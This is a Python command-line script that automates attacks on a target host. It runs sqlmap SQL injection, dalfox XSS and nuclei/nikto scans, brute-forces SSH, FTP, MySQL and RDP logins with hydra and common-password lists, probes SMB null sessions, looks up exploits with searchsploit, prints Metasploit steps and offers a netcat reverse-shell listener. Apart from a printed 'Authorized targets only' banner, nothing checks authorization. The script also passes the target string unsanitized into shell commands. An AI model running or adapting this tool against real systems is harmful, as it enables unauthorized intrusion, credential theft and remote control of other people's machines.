#!/usr/bin/env python3
import os, sys, subprocess, re, time
from datetime import datetime

RED = "[91m"
GREEN = "[92m"
CYAN = "[96m"
YELLOW = "[93m"
MAGENTA = "[95m"
BOLD = "[1m"
NC = "[0m"

def banner(target):
    print(RED + BOLD + """
 █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗
██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝
███████║   ██║      ██║   ███████║██║     █████╔╝
██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗
██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗
╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
""" + NC)
    print(YELLOW + "  Target : " + BOLD + target + NC)
    print(YELLOW + "  Time   : " + datetime.now().strftime("%Y-%m-%d %H:%M:%S") + NC)
    print(RED + BOLD + "  Authorized targets only" + NC + "\n")

def make_report_dir(target):
    safe = target.replace("/","_").replace(":","_")
    path = os.path.expanduser("~/ghost-reports/attack_" + safe + "_" + datetime.now().strftime("%Y%m%d_%H%M%S"))
    os.makedirs(path, exist_ok=True)
    return path

def run_cmd(cmd, label, rd, filename, timeout=180):
    print("\n" + CYAN + "[*] " + label + "..." + NC)
    out_file = rd + "/" + filename + ".txt"
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        output = result.stdout + result.stderr
        with open(out_file, "w") as f:
            f.write(output)
        if output.strip():
            print(GREEN + output[:600] + NC)
        else:
            print(YELLOW + "  [!] No output" + NC)
        return output
    except subprocess.TimeoutExpired:
        print(YELLOW + "  [!] Timed out" + NC)
        return ""

def attack_web(target, rd):
    print("\n" + MAGENTA + BOLD + "=== WEB ATTACKS ===" + NC)
    print("\n" + RED + "[>] SQL INJECTION" + NC)
    run_cmd("sqlmap -u https://" + target + " --crawl=2 --batch --level=2 --risk=2 2>/dev/null | tail -20", "SQLmap", rd, "sqli", timeout=120)
    print("\n" + RED + "[>] XSS SCAN" + NC)
    run_cmd("dalfox url https://" + target + " --silence 2>/dev/null | head -20", "Dalfox XSS", rd, "xss")
    print("\n" + RED + "[>] VULNERABILITY SCAN" + NC)
    run_cmd("nuclei -u https://" + target + " -severity medium,high,critical -silent 2>/dev/null", "Nuclei", rd, "nuclei")
    print("\n" + RED + "[>] NIKTO SCAN" + NC)
    run_cmd("nikto -h " + target + " -maxtime 60 2>/dev/null | tail -30", "Nikto", rd, "nikto")

def attack_services(target, rd):
    print("\n" + MAGENTA + BOLD + "=== SERVICE ATTACKS ===" + NC)
    wl = "/opt/homebrew/share/seclists/Passwords/Common-Credentials/10k-most-common.txt"
    ul = "/opt/homebrew/share/seclists/Usernames/top-usernames-shortlist.txt"
    print("\n" + CYAN + "[*] Scanning open ports..." + NC)
    r = subprocess.run("sudo nmap -sV --open -T4 " + target + " 2>/dev/null", shell=True, capture_output=True, text=True, timeout=120)
    ports = r.stdout
    print(GREEN + ports[:400] + NC)
    if "22/tcp" in ports:
        print("\n" + RED + "[>] SSH BRUTE FORCE" + NC)
        run_cmd("hydra -L " + ul + " -P " + wl + " ssh://" + target + " -t 4 -f 2>/dev/null | tail -10", "SSH brute", rd, "ssh", timeout=120)
    if "21/tcp" in ports:
        print("\n" + RED + "[>] FTP ATTACK" + NC)
        run_cmd("hydra -l anonymous -p anonymous ftp://" + target + " -f 2>/dev/null | tail -5", "FTP anon", rd, "ftp")
    if "3306/tcp" in ports:
        print("\n" + RED + "[>] MYSQL ATTACK" + NC)
        run_cmd("hydra -l root -P " + wl + " mysql://" + target + " -f 2>/dev/null | tail -5", "MySQL brute", rd, "mysql", timeout=60)
    if "445/tcp" in ports:
        print("\n" + RED + "[>] SMB ATTACK" + NC)
        run_cmd("smbclient -L //" + target + " -N 2>/dev/null | head -20", "SMB null session", rd, "smb")
    if "3389/tcp" in ports:
        print("\n" + RED + "[>] RDP ATTACK" + NC)
        run_cmd("hydra -L " + ul + " -P " + wl + " rdp://" + target + " -t 4 -f 2>/dev/null | tail -10", "RDP brute", rd, "rdp", timeout=120)

def attack_exploits(target, rd):
    print("\n" + MAGENTA + BOLD + "=== EXPLOIT SEARCH ===" + NC)
    run_cmd("sudo nmap -sV " + target + " 2>/dev/null | grep open | head -20", "Service versions", rd, "versions")
    run_cmd("searchsploit --nmap " + rd + "/versions.txt 2>/dev/null | head -30", "Searchsploit CVEs", rd, "exploits")
    print("\n" + YELLOW + "[*] Metasploit commands for this target:" + NC)
    print(CYAN + "    msfconsole -q" + NC)
    print(CYAN + "    search type:exploit" + NC)
    print(CYAN + "    set RHOSTS " + target + NC)
    print(CYAN + "    run" + NC)

def main():
    if len(sys.argv) < 2:
        print(RED + "Usage: attack <target>" + NC)
        sys.exit(1)
    target = sys.argv[1]
    rd = make_report_dir(target)
    banner(target)
    print(YELLOW + "Select mode:" + NC)
    print("  " + CYAN + "1" + NC + " - Web attacks (SQLi, XSS, vulns)")
    print("  " + CYAN + "2" + NC + " - Service attacks (SSH, FTP, SMB, RDP)")
    print("  " + CYAN + "3" + NC + " - Exploit search + Metasploit")
    print("  " + CYAN + "4" + NC + " - Full attack (everything)")
    choice = input("\n" + YELLOW + "[?] Choice [1-4]: " + NC).strip()
    if choice == "1": attack_web(target, rd)
    elif choice == "2": attack_services(target, rd)
    elif choice == "3": attack_exploits(target, rd)
    elif choice == "4":
        attack_web(target, rd)
        attack_services(target, rd)
        attack_exploits(target, rd)
    else:
        print(RED + "Invalid" + NC)
        sys.exit(1)
    port = input("\n" + YELLOW + "[?] Start reverse shell listener? Enter port (or press Enter to skip): " + NC).strip()
    if port:
        print(GREEN + "[+] Listening on port " + port + "..." + NC)
        os.system("nc -lvnp " + port)
    print("\n" + GREEN + BOLD + "[✓] ATTACK COMPLETE" + NC)
    print(CYAN + "[+] Results: " + rd + NC + "\n")

if __name__ == "__main__":
    main()
